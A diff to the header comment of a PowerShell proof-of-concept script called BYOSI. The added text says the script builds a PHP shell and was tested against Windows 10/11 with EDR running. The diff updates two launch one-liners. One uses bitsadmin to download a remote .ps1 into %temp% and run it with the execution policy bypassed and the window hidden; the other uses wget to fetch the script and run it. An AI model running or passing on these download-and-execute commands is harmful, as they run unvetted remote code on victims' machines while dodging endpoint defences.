@@ -1,21 +1,12 @@
 <# 
+BYOSI POC - Changed the interpreter, the environment variables, arguments, and made a new php shell.
+            Tested against a default installation of Windows 10 updated, and Windows 10/11 with EDR running.
 
- .----------------.  .----------------.  .----------------.  .----------------.  .----------------.   .----------------.  .----------------.  .----------------. 
-| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. | | .--------------. || .--------------. || .--------------. |
-| |   ______     | || |  ____  ____  | || |     ____     | || |    _______   | || |     _____    | | | |   ______     | || |     ____     | || |     ______   | |
-| |  |_   _ \    | || | |_  _||_  _| | || |   .'    `.   | || |   /  ___  |  | || |    |_   _|   | | | |  |_   __ \   | || |   .'    `.   | || |   .' ___  |  | |
-| |    | |_) |   | || |   \ \  / /   | || |  /  .--.  \  | || |  |  (__ \_|  | || |      | |     | | | |    | |__) |  | || |  /  .--.  \  | || |  / .'   \_|  | |
-| |    |  __'.   | || |    \ \/ /    | || |  | |    | |  | || |   '.___`-.   | || |      | |     | | | |    |  ___/   | || |  | |    | |  | || |  | |         | |
-| |   _| |__) |  | || |    _|  |_    | || |  \  `--'  /  | || |  |`\____) |  | || |     _| |_    | | | |   _| |_      | || |  \  `--'  /  | || |  \ `.___.'\  | |
-| |  |_______/   | || |   |______|   | || |   `.____.'   | || |  |_______.'  | || |    |_____|   | | | |  |_____|     | || |   `.____.'   | || |   `._____.'  | |
-| |              | || |              | || |              | || |              | || |              | | | |              | || |              | || |              | |
-| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' | | '--------------' || '--------------' || '--------------' |
- '----------------'  '----------------'  '----------------'  '----------------'  '----------------'   '----------------'  '----------------'  '----------------' 
 Method 1
- bitsadmin /transfer myDownloadJob /download /priority high https://raw.githubusercontent.com/fuzzlove/Bug-Bounty-Toolz/refs/heads/master/byosipoc.ps1 %temp%\myscript.ps1 & powershell -exec bypass -nop -w hidden -file %temp%\myscript.ps1
+ bitsadmin /transfer myDownloadJob /download /priority high https://raw.githubusercontent.com/fuzzlove/byosi/refs/heads/main/byosi.ps1 %temp%\myscript.ps1 & powershell -exec bypass -nop -w hidden -file %temp%\myscript.ps1
 
 Method 2
-wget https://raw.githubusercontent.com/fuzzlove/Bug-Bounty-Toolz/refs/heads/master/byosi.ps1 -o byosipoc.ps1;./byosipoc.ps1
+wget https://raw.githubusercontent.com/fuzzlove/byosi/refs/heads/main/byosi.ps1 -o byosipoc.ps1;./byosipoc.ps1
 
 #>
 
